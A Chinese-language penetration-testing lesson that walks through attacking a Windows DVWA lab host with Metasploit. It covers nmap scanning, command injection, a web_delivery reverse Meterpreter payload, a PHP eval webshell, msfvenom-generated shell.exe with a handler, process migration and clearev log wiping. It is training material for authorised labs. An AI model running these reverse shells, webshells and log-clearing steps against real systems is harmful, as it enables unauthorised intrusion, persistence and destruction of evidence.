# Kali渗透测试：P66：MSF攻击Windows实例 🎯

在本节课中，我们将学习如何利用Metasploit Framework（MSF）对一个Windows目标进行渗透测试。课程将涵盖从信息收集、漏洞利用到建立持久化会话的完整流程，并通过一个具体的DVWA靶场实例进行演示。

## 概述

我们将攻击一个运行着DVWA（Damn Vulnerable Web Application）的Windows靶机。主要思路是：首先通过端口扫描发现开放的Web服务（80端口），然后利用DVWA中的命令执行漏洞，结合MSF的`web_delivery`模块，在不写入文件的情况下获得一个Meterpreter会话。最后，我们会探讨如何通过进程迁移来维持访问权限并清除痕迹。

---

![](img/43b7f6aa48f5dd069b4b900d23e58878_1.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_3.png)

## 信息收集与突破口分析 🔍

在开始攻击之前，我们需要对目标进行信息收集。上一节我们介绍了信息收集的方法，本节中我们来看看如何确定攻击的突破口。

![](img/43b7f6aa48f5dd069b4b900d23e58878_5.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_7.png)

我们使用Nmap进行端口扫描，命令如下：
```bash
nmap -sV -T4 <目标IP>
```
扫描结果显示目标开放了80、445、3306等端口，且操作系统为Windows。

![](img/43b7f6aa48f5dd069b4b900d23e58878_9.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_10.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_12.png)

在渗透测试中，80端口（Web服务）通常是漏洞最多的突破口。OWASP Top 10中列出的大多数漏洞，如SQL注入、XSS、文件上传等，都存在于Web应用中。因此，我们的首要目标是探测其Web应用。

---

![](img/43b7f6aa48f5dd069b4b900d23e58878_14.png)

## 方法一：利用命令执行漏洞

![](img/43b7f6aa48f5dd069b4b900d23e58878_16.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_18.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_20.png)

我们访问目标的80端口，发现其运行着DVWA靶场。DVWA包含一个命令执行（Command Injection）的练习模块。

![](img/43b7f6aa48f5dd069b4b900d23e58878_22.png)

### 发现并利用漏洞

![](img/43b7f6aa48f5dd069b4b900d23e58878_24.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_26.png)

以下是利用命令执行漏洞的步骤：

![](img/43b7f6aa48f5dd069b4b900d23e58878_28.png)

1.  访问DVWA的命令执行模块（`/vulnerabilities/exec/`）。
2.  将安全级别设置为`low`。
3.  在输入框中尝试拼接命令。例如，输入`127.0.0.1 & whoami`。这里的`&`符号用于在执行完ping命令后，继续执行`whoami`命令。
4.  提交后，如果页面返回了当前用户名（如`nt authority\system`），则证明存在命令执行漏洞。

### 引入MSF的Web Delivery模块

当我们拥有命令执行权限但尚未获得完整Shell时，可以使用MSF的`web_delivery`模块。该模块能快速与受害者主机建立一条稳定的Session，其优点是将服务器代码加载到内存中执行，无需在磁盘上写入文件，有利于绕过检测。

以下是使用该模块的流程：

1.  在MSF中加载模块并设置参数：
    ```bash
    use exploit/multi/script/web_delivery
    set target 0 # 根据目标环境选择，0为Python，1为PHP，2为Powershell
    set payload windows/meterpreter/reverse_tcp
    set LHOST <你的IP>
    set LPORT <监听端口>
    run
    ```
2.  执行后，模块会生成一行命令（例如一段Python代码）。
3.  将生成的这行命令，通过之前发现的Web命令执行漏洞在目标上运行。
4.  如果目标系统环境配置正确（例如有Python环境且命令可执行），MSF将会收到一个反向连接的Meterpreter会话。

**注意**：在实际测试中，可能因为目标服务器未配置PHP或Python环境变量而导致命令执行失败。此时需要根据目标情况调整`target`类型（如尝试PHP或Powershell）。

![](img/43b7f6aa48f5dd069b4b900d23e58878_30.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_32.png)

---

![](img/43b7f6aa48f5dd069b4b900d23e58878_34.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_36.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_37.png)

## 方法二：上传WebShell并建立持久化会话

![](img/43b7f6aa48f5dd069b4b900d23e58878_39.png)

如果目标存在文件上传漏洞，我们可以上传一个WebShell，从而获得更稳定的控制权。

![](img/43b7f6aa48f5dd069b4b900d23e58878_41.png)

### 上传并连接WebShell

1.  利用漏洞（例如ThinkPHP 5.x的远程命令执行漏洞）将一句话木马上传到服务器。木马内容为：
    ```php
    <?php @eval($_POST[‘cmd‘]);?>
    ```
2.  使用中国菜刀、蚁剑等工具连接该WebShell的URL，密码为`cmd`。

![](img/43b7f6aa48f5dd069b4b900d23e58878_43.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_45.png)

### 通过WebShell部署Meterpreter

![](img/43b7f6aa48f5dd069b4b900d23e58878_47.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_49.png)

获得WebShell后，我们可以上传一个由MSF生成的木马程序，并执行它以获得Meterpreter会话。

![](img/43b7f6aa48f5dd069b4b900d23e58878_51.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_53.png)

1.  在MSF中生成一个Windows可执行木马：
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<端口> -f exe -o shell.exe
    ```
2.  通过WebShell的文件上传功能，将`shell.exe`上传到目标服务器（如`C:\\`目录下）。
3.  通过WebShell的终端功能，执行命令`C:\\shell.exe`。
4.  在MSF中启动监听器，等待连接：
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <你的IP>
    set LPORT <端口>
    run
    ```
5.  成功连接后，便获得了一个Meterpreter会话。

![](img/43b7f6aa48f5dd069b4b900d23e58878_55.png)

![](img/43b7f6aa48f5dd069b4b900d23e58878_57.png)

---

## 权限维持与痕迹清除 🛡️

直接运行的木马进程容易被管理员发现并结束。为了维持访问，我们需要进行进程迁移和痕迹清除。

### 进程迁移

1.  在Meterpreter会话中，使用`getpid`命令查看当前木马进程的ID。
2.  使用`ps`命令列出目标系统上的所有进程，寻找一个稳定的、高权限的进程（如`httpd.exe`, `mysqld.exe`等系统服务进程）。
3.  使用`migrate <目标进程PID>`命令，将当前会话迁移到目标进程中。这样，即使原始木马文件被删除，会话仍会依附于合法进程继续存在。

### 清除痕迹

Meterpreter提供`clearev`命令，可以清除目标系统上的应用程序、系统和安全日志，减少被追踪的风险。

---

## 总结

本节课我们一起学习了利用MSF攻击Windows实例的完整流程：

1.  **信息收集**：使用Nmap扫描，确定Web服务为突破口。
2.  **漏洞利用**：
    *   **方法一**：利用DVWA的命令执行漏洞，结合`web_delivery`模块直接获取内存中的Meterpreter会话。
    *   **方法二**：利用文件上传漏洞部署WebShell，再通过WebShell上传并执行木马，获得Meterpreter会话。
3.  **后渗透**：通过**进程迁移**将会话注入到系统关键进程中实现持久化，并使用`clearev`**清除操作痕迹**。

![](img/43b7f6aa48f5dd069b4b900d23e58878_59.png)

整个流程的核心在于灵活运用MSF的各种模块，并根据目标环境调整攻击策略。请务必在授权的合法环境中进行练习，以熟练掌握这些技术。